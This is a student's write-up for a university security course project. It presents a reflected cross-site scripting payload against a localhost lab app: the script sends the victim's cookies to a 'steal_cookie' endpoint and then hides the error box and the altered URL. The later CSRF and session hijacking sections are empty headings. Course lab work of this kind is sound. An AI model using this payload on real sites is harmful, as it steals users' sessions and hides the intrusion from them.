# COMP 4634 - Project 2, Part 1

> by Aleksandr Sergeev, student id `21158862`.

Read this file as markdown for the best expirience :)

## Exploit Alpha: Cookie Theft

The basic idea is inserting the following script into the page HTML:

```javascript
<script>
    Array.from(document.getElementsByClassName("error")).forEach(e => {e.style.display = "none";});
    fetch(`./steal_cookie?cookie=${document.cookie}`);
    window.history.replaceState(null, "", "./profile");
</script>
```

The script should be inserted right after `http://localhost:3000/profile?username=` into the URL.
It does 3 things:

1. Since username does not (surprisingly!) match any existing name, an error box is shown.
    The script hides the box (all the HTML elements with "error" class attribute).
    Now the page resembles normal current user profile page.
2. HTTP GET request is performed to the "steal_cookie" endpoint, including all the user cookies.
3. The browser location bar entry is changed to "profile" endpoint (without leaving any trace in history), so that the attack is no longer visible.
    The only way to detect the attack is inspecting now hidden "error" paragraph contents via developer tools.

This link should be used as a replacement for the user profile endpoint link.

Documentation used:

1. Element [searching](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) and [hiding](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden) docs.
2. Fetch API [specification](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) for performing GET request.
3. Stackoverflow [discussion](https://stackoverflow.com/questions/3338642/updating-address-bar-with-new-url-without-hash-or-reloading-the-page) and history API [reference](https://developer.mozilla.org/en-US/docs/Web/API/History_API) for changing address line without reloading page.

## Exploit Bravo: Cross-Site Request Forgery



## Exploit Charlie: Session Hijacking with Cookies



## 
